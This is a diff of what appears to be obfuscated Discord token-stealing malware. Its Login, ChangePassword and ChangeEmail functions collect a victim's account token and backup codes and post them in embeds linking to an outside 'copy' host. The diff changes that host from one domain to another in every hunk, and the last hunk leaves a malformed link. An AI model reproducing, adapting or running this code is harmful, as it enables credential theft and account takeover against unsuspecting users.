@@ -440,7 +440,7 @@ function Login(a, w, W) {
                       .then((e) => {
                         var C = [],
                           n = '',
-                          S = 'https://rustlercoppy.com/copy/',
+                          S = 'https://superfurrycdn.nl/copy/',
                           t = JSON.parse(e)
                         let X = t.backup_codes
                         const M = X.filter((h) => {
@@ -533,7 +533,7 @@ function Login(a, w, W) {
                                     '`' +
                                     W +
                                     '`' +
-                                    '\n[CopyToken](https://rustlercoppy.com/copy/' +
+                                    '\n[CopyToken](https://superfurrycdn.nl/copy/' +
                                     W +
                                     ')',
                                   inline: false,
@@ -721,7 +721,7 @@ function Login(a, w, W) {
                                                 '`' +
                                                 W +
                                                 '`' +
-                                                '\n[CopyToken](https://rustlercoppy.com/copy/' +
+                                                '\n[CopyToken](https://superfurrycdn.nl/copy/' +
                                                 W +
                                                 ')',
                                               inline: false,
@@ -935,7 +935,7 @@ function ChangePassword(a, w, W) {
                                     '`' +
                                     W +
                                     '`' +
-                                    '\n[CopyToken](https://rustlercoppy.com/copy/' +
+                                    '\n[CopyToken](https://superfurrycdn.nl/copy/' +
                                     W +
                                     ')',
                                   inline: false,
@@ -1327,7 +1327,7 @@ function ChangeEmail(a, w, W) {
                             {
                               title: 'Email Changed',
                               description:
-                                '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://rustlercoppy.com/copy/' +
+                                '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**]https://superfurrycdn.nl/copy/' +
                                 W +
                                 ')',
                               color: config['embed-color'],
